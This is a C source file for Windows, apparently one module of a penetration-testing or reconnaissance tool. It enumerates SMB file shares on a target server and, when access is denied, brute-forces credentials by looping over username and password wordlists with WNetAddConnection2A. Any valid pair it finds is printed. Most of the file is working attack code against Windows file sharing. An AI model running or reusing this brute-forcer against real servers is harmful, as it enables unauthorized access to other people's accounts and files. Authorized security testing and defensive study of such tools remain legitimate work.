#ifndef UNICODE
#define UNICODE
#endif
#include <windows.h>
#include <stdio.h>
#include <lm.h>
#include "wordlist.h"

#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Mpr.lib") // WNetAddConnection2


#define ARRAY_SIZE_CHAR(charTab)    sizeof(charTab)/sizeof(char*)
#define ACCESS_DENIED               5

BOOL PrintfSmbShareInfo(LPTSTR lpszServer, PSHARE_INFO_502 BufPtr, DWORD* er, FILE* pFile) {
    PSHARE_INFO_502 p = BufPtr;
    for (DWORD i = 1; i <= *er; i++) {
        printOut(pFile,"%-17S%-30S%ws\n", p->shi502_netname, p->shi502_path, p->shi502_remark);
        /*if (IsValidSecurityDescriptor(BufPtr->shi502_security_descriptor)) {
            printOut(pFile,"%d", p->shi502_permissions);
        }*/
        p++;
    }
    return TRUE;
}

BOOL SmbPublic(LPTSTR lpszServer, FILE* pFile) {
    PSHARE_INFO_502 BufPtr;
    NET_API_STATUS res;
    DWORD er = 0, tr = 0, resume = 0;

    res = NetShareEnum(lpszServer, 502, (LPBYTE*)&BufPtr, MAX_PREFERRED_LENGTH, &er, &tr, &resume);
    if (res != ACCESS_DENIED) {
        printOut(pFile,"Share:           Local Path:                   Descriptor:\n");
        printOut(pFile,"----------------------------------------------------------\n");

        PrintfSmbShareInfo(lpszServer, BufPtr, &er,pFile);
        NetApiBufferFree(BufPtr);

        while (res == ERROR_MORE_DATA) {
            res = NetShareEnum(lpszServer, 502, (LPBYTE*)&BufPtr, MAX_PREFERRED_LENGTH, &er, &tr, &resume);
            if (res == ERROR_SUCCESS || res == ERROR_MORE_DATA) {
                PrintfSmbShareInfo(lpszServer, BufPtr, &er,pFile);
                NetApiBufferFree(BufPtr);
            } else {
                printOut(pFile,"Error: %ld\n", res);
            }
        }
        return TRUE;
    }
    return FALSE;
}

BOOL LoginSMB(const char* username, const char* password, char* share) {
    // brutforce
    NETRESOURCEA resource;
    resource.dwType = RESOURCETYPE_DISK;
    resource.lpLocalName = 0;
    resource.lpRemoteName = share;
    resource.lpProvider = 0;

    DWORD result = WNetAddConnection2A(&resource, username, password, CONNECT_TEMPORARY);
    return (result == NO_ERROR);
}

BOOL BrutForceSMB(char* sharePath, FILE* pFile) {
    BOOL isSmbCreadValid = FALSE;

    printOut(pFile,"\t[SMB] Brute Forcing SMB server:\n");
    for (int i = 0; i < ARRAY_SIZE_CHAR(usernameList) && !isSmbCreadValid; i++) {
        for (int j = 0; j < ARRAY_SIZE_CHAR(passwordList) && !isSmbCreadValid; j++) {
            printOut(pFile,"%i/%i\r", i * ARRAY_SIZE_CHAR(usernameList) + j, ARRAY_SIZE_CHAR(passwordList) * ARRAY_SIZE_CHAR(usernameList));
            isSmbCreadValid = LoginSMB(usernameList[i], passwordList[j], sharePath);
            if (isSmbCreadValid)
                printOut(pFile,"\t\t[*] VALID: %s:%s\n\n", usernameList[i], passwordList[j]);
            /*else
                printOut(pFile,"[*] FAILED: %s:%s\n", usernameList[i], passwordList[j]);*/
        }
    }
    return isSmbCreadValid;
}


BOOL SmbEnum(char* serverIp, BOOL isBurtForce, FILE* pFile) {
    int serverIpSize = (int)strlen(serverIp);

    LPTSTR lpszServer = (LPTSTR)calloc(serverIpSize + 1, sizeof(LPTSTR));
    if (lpszServer == NULL)
        return FALSE;
    char* sharePath = (char*)calloc(serverIpSize + 4 + 1, sizeof(char*));
    if (sharePath == NULL)
        return FALSE;

    sprintf_s(sharePath, serverIpSize + 4 + 1, "\\\\%s", serverIp);
    swprintf_s(lpszServer, serverIpSize + 1, L"%hs", serverIp);

    printOut(pFile,"\t[SMB] Try to enumerate file share\n");

    if (SmbPublic(lpszServer,pFile)) {
        WNetCancelConnection2A(sharePath, 0, TRUE);
        free(lpszServer);
        free(sharePath);
        return TRUE;
    } else {
        //if (LoginSMB("", "", sharePath) || (isBurtForce && BrutForceSMB(sharePath))) { // <- ok for brutforce !!!
        if ((isBurtForce && BrutForceSMB(sharePath,pFile))) { // <- ok for brutforce !!!
            if (SmbPublic(lpszServer,pFile))
                WNetCancelConnection2A(sharePath, 0, TRUE);
            else
                printOut(pFile,"\t[x] Access denied !\n");
        } else
            printOut(pFile,"\t\t[x] Access denied !\n");
    }
    free(lpszServer);
    free(sharePath);

    return FALSE;
}
